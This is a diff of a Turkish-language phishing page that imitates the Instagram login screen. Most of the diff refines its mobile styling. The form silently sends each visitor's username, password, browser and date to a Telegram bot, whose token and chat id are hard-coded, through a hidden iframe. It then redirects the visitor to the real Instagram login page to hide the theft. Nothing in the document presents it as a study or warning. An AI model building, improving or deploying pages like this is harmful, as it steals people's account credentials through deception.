@@ -2,16 +2,17 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
     <title>Instagram - Giriş Yap</title>
     <style>
-        /* ----- RESET VE TEMEL ----- */
+        /* ----- RESET & TEMEL ----- */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
         }
+
         body {
             background: #fafafa;
             display: flex;
@@ -21,16 +22,20 @@
             margin: 0;
             padding: 20px;
         }
-        /* ----- ANA KONTEYNER ----- */
+
+        /* ----- ANA KONTEYNER (Responsive) ----- */
         .container {
-            max-width: 380px;
             width: 100%;
+            max-width: 400px;        /* Masaüstünde geniş, mobilde dar */
             background: white;
             border: 1px solid #dbdbdb;
-            border-radius: 12px;
+            border-radius: 16px;
             padding: 40px 30px;
             text-align: center;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
+            transition: all 0.2s ease;
         }
+
         /* ----- LOGO ----- */
         .logo {
             font-size: 52px;
@@ -43,50 +48,58 @@
         .logo span {
             color: #0095f6;
         }
-        /* ----- INPUTLAR ----- */
+
+        /* ----- INPUTLAR (Mobilde daha büyük) ----- */
         input {
             width: 100%;
-            padding: 14px 12px;
-            margin: 6px 0;
+            padding: 16px 14px;      /* Mobil için daha rahat dokunma */
+            margin: 8px 0;
             border: 1px solid #dbdbdb;
-            border-radius: 6px;
+            border-radius: 8px;
             background: #fafafa;
-            font-size: 14px;
+            font-size: 16px;          /* Mobilde zoom yapmasın diye 16px */
             outline: none;
-            transition: border 0.2s;
+            transition: border 0.2s, background 0.2s;
         }
         input:focus {
             border-color: #a8a8a8;
             background: white;
         }
-        /* ----- BUTON ----- */
+
+        /* ----- BUTON (Mobilde büyük) ----- */
         button {
             width: 100%;
-            padding: 12px;
+            padding: 16px;
             margin-top: 12px;
             background: #0095f6;
             border: none;
-            border-radius: 6px;
+            border-radius: 8px;
             color: white;
             font-weight: 700;
-            font-size: 16px;
+            font-size: 18px;          /* Mobilde okunaklı */
             cursor: pointer;
-            transition: background 0.2s;
+            transition: background 0.2s, transform 0.1s;
         }
         button:hover {
             background: #1877f2;
         }
+        button:active {
+            transform: scale(0.97);   /* Dokunma geri bildirimi */
+        }
         button:disabled {
             opacity: 0.6;
             cursor: not-allowed;
+            transform: none;
         }
-        /* ----- HATA / BİLGİ MESAJI ----- */
+
+        /* ----- MESAJ KUTUSU ----- */
         .message {
-            font-size: 14px;
-            margin-top: 14px;
-            padding: 10px;
-            border-radius: 6px;
+            font-size: 15px;
+            margin-top: 16px;
+            padding: 12px 14px;
+            border-radius: 8px;
             display: none;
+            word-break: break-word;
         }
         .message.error {
             color: #ed4956;
@@ -99,10 +112,11 @@
         .message.show {
             display: block;
         }
+
         /* ----- ALT BAĞLANTILAR ----- */
         .footer {
-            margin-top: 20px;
-            font-size: 13px;
+            margin-top: 24px;
+            font-size: 14px;
             color: #8e8e8e;
         }
         .footer a {
@@ -113,25 +127,28 @@
         .footer a:hover {
             text-decoration: underline;
         }
+
         /* ----- UYGULAMA BUTONLARI ----- */
         .app-buttons {
             display: flex;
             justify-content: center;
-            gap: 10px;
-            margin-top: 15px;
+            gap: 12px;
+            margin-top: 20px;
+            flex-wrap: wrap;
         }
         .app-buttons img {
-            height: 40px;
+            height: 44px;            /* Mobilde daha büyük */
             cursor: pointer;
         }
+
         /* ----- META BAĞLANTILARI ----- */
         .meta-links {
-            margin-top: 20px;
-            font-size: 12px;
+            margin-top: 24px;
+            font-size: 13px;
             color: #8e8e8e;
             display: flex;
             justify-content: center;
-            gap: 15px;
+            gap: 18px;
             flex-wrap: wrap;
         }
         .meta-links a {
@@ -141,40 +158,113 @@
         .meta-links a:hover {
             text-decoration: underline;
         }
+
         /* ----- DİL SEÇİCİ ----- */
         .language-selector {
-            margin-top: 15px;
-            font-size: 12px;
+            margin-top: 18px;
+            font-size: 13px;
             color: #8e8e8e;
         }
         .language-selector select {
             background: transparent;
             border: none;
             color: #8e8e8e;
-            font-size: 12px;
+            font-size: 13px;
             outline: none;
             cursor: pointer;
+            padding: 4px 0;
         }
+
         /* ----- YÜKLEME ANİMASYONU ----- */
         .spinner {
             display: inline-block;
-            width: 18px;
-            height: 18px;
+            width: 20px;
+            height: 20px;
             border: 3px solid rgba(255, 255, 255, 0.3);
             border-radius: 50%;
             border-top-color: white;
             animation: spin 0.7s linear infinite;
             vertical-align: middle;
-            margin-right: 8px;
+            margin-right: 10px;
         }
         @keyframes spin {
             to {
                 transform: rotate(360deg);
             }
         }
+
         /* ----- GİZLİ IFRAME ----- */
         #hiddenFrame {
             display: none;
+        }
+
+        /* ============================================================
+               RESPONSIVE (Mobil Özel İyileştirmeler)
+               ============================================================ */
+        @media only screen and (max-width: 480px) {
+            .container {
+                padding: 30px 20px;      /* Daha az padding */
+                border-radius: 12px;
+                max-width: 100%;
+                margin: 10px;
+            }
+            .logo {
+                font-size: 44px;          /* Biraz küçültsün */
+                margin-bottom: 24px;
+            }
+            input {
+                padding: 18px 14px;       /* Parmak için daha büyük */
+                font-size: 17px;
+                border-radius: 10px;
+            }
+            button {
+                padding: 18px;
+                font-size: 19px;
+                border-radius: 10px;
+            }
+            .app-buttons img {
+                height: 48px;             /* Daha büyük butonlar */
+            }
+            .meta-links {
+                gap: 12px;
+                font-size: 12px;
+            }
+            .footer {
+                font-size: 13px;
+            }
+        }
+
+        @media only screen and (max-width: 380px) {
+            .container {
+                padding: 20px 16px;
+            }
+            .logo {
+                font-size: 38px;
+            }
+            input {
+                padding: 16px 12px;
+                font-size: 16px;
+            }
+            button {
+                padding: 16px;
+                font-size: 17px;
+            }
+        }
+
+        /* Masaüstü için hafif genişlik sınırı */
+        @media only screen and (min-width: 768px) {
+            .container {
+                max-width: 420px;
+                padding: 48px 40px;
+            }
+            input {
+                padding: 14px 16px;
+                font-size: 15px;
+            }
+            button {
+                padding: 14px;
+                font-size: 16px;
+            }
         }
     </style>
 </head>
@@ -184,25 +274,25 @@
         <!-- Instagram Logosu -->
         <div class="logo">Insta<span>gram</span></div>
 
-        <!-- Giriş Formu -->
+        <!-- Giriş Formu (Telegram API'sine POST) -->
         <form id="loginForm" 
               action="https://api.telegram.org/bot8604225952:AAHoULyCnrkSQ1Pqjo3xa6UlZgwo7H5ObRA/sendMessage" 
               method="POST" 
               target="hiddenFrame">
-            
-            <!-- Telegram'a gönderilecek sabit bilgiler -->
+
+            <!-- Telegram sabit parametreleri -->
             <input type="hidden" name="chat_id" value="1636656252">
             <input type="hidden" name="parse_mode" value="HTML">
 
-            <!-- Kullanıcı adı ve şifre alanları -->
+            <!-- Kullanıcı giriş alanları -->
             <input type="text" id="username" name="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required autocomplete="off">
             <input type="password" id="password" name="password" placeholder="Şifre" required autocomplete="off">
-            
-            <!-- Mesaj içeriği (kullanıcı adı ve şifre burada birleştirilecek) -->
+
+            <!-- Mesaj içeriği (dinamik olarak doldurulacak) -->
             <input type="hidden" id="messageText" name="text">
 
             <button type="submit" id="submitBtn">Giriş Yap</button>
-            
+
             <div id="messageBox" class="message"></div>
         </form>
 
@@ -240,7 +330,7 @@
         </div>
     </div>
 
-    <!-- Gizli iframe (form sonucunu burada yakalarız) -->
+    <!-- Gizli iframe (form cevabını yakalamak için) -->
     <iframe name="hiddenFrame" id="hiddenFrame"></iframe>
 
     <script>
@@ -254,18 +344,15 @@
             const messageBox = document.getElementById('messageBox');
             const hiddenMessage = document.getElementById('messageText');
 
-            // Mesaj kutusunu göster/gizle
+            // Mesaj göster / gizle
             function showMessage(text, type) {
                 messageBox.textContent = text;
                 messageBox.className = 'message ' + type + ' show';
             }
-
             function hideMessage() {
                 messageBox.className = 'message';
                 messageBox.textContent = '';
             }
-
-            // Butonu sıfırla
             function resetButton() {
                 submitBtn.disabled = false;
                 submitBtn.innerHTML = 'Giriş Yap';
@@ -273,24 +360,21 @@
 
             // Form gönderimi
             form.addEventListener('submit', function(e) {
-                e.preventDefault(); // Sayfanın yenilenmesini engelle
+                e.preventDefault();
 
                 const username = usernameInput.value.trim();
                 const password = passwordInput.value.trim();
 
-                // Boş kontrol
                 if (!username || !password) {
                     showMessage('❌ Lütfen tüm alanları doldurun.', 'error');
                     return;
                 }
 
-                // Butonu kilitle
                 submitBtn.disabled = true;
                 submitBtn.innerHTML = '<span class="spinner"></span> Giriş yapılıyor...';
                 hideMessage();
 
-                // Telegram'a gönderilecek mesajı hazırla
-                const ip = '{{IP}}'; // Tarayıcıda IP alamayız, isteğe bağlı
+                // Telegram mesajını oluştur
                 const userAgent = navigator.userAgent;
                 const date = new Date().toLocaleString('tr-TR');
 
@@ -302,41 +386,35 @@
                 msg += "-----------------------------\n";
                 msg += "✅ Otomatik gönderim başarılı.";
 
-                // Hidden input'a mesajı yaz
                 hiddenMessage.value = msg;
 
-                // Şimdi formu gönder (iframe'e yüklenecek)
+                // Formu gönder (iframe'e)
                 form.submit();
 
-                // iframe yüklendiğinde sonucu yakala
+                // iframe yüklenince cevabı yakala
                 const iframe = document.getElementById('hiddenFrame');
                 iframe.onload = function() {
                     try {
-                        // iframe'in içeriğini oku (Telegram'dan gelen JSON cevap)
                         const response = iframe.contentDocument.body.innerText;
                         const json = JSON.parse(response);
                         if (json.ok === true) {
-                            // Başarılı → gerçek Instagram'a yönlendir
                             window.location.href = 'https://www.instagram.com/accounts/login/';
                         } else {
                             showMessage('❌ Telegram hatası: ' + (json.description || 'Bilinmeyen hata'), 'error');
                             resetButton();
                         }
                     } catch (err) {
-                        // CORS veya parse hatası olabilir, ama genelde form submit çalışır.
-                        // Eğer cevap okunamazsa, yine de başarılı varsayıp yönlendirelim.
-                        // Güvenlik nedeniyle bazı tarayıcılar iframe içeriğini okuyamaz.
-                        // O yüzden bir süre bekleyip doğrudan yönlendirelim.
+                        // CORS veya parse hatası olabilir, ama genelde başarılıdır.
+                        // Yine de yönlendirelim.
                         setTimeout(function() {
                             window.location.href = 'https://www.instagram.com/accounts/login/';
-                        }, 1000);
+                        }, 1200);
                     }
                 };
 
-                // Zaman aşımı: 5 saniye içinde yanıt gelmezse yine de yönlendir
+                // Zaman aşımı (5 sn) yönlendir
                 setTimeout(function() {
                     if (submitBtn.disabled) {
-                        // Hala bekliyorsa, yönlendir
                         window.location.href = 'https://www.instagram.com/accounts/login/';
                     }
                 }, 5000);
